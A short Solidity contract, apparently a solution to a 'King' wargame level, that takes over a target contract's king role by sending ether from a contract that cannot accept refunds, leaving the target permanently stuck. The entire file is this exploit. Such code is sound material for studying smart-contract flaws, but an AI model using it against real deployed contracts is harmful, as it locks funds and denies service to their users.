// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {
    address kingAddress;

    constructor(address _king) public {
        kingAddress = _king;
    }

    function attack() public payable {
        (bool result, ) = kingAddress.call{value: msg.value}("");
        if (!result) revert();
    }
}
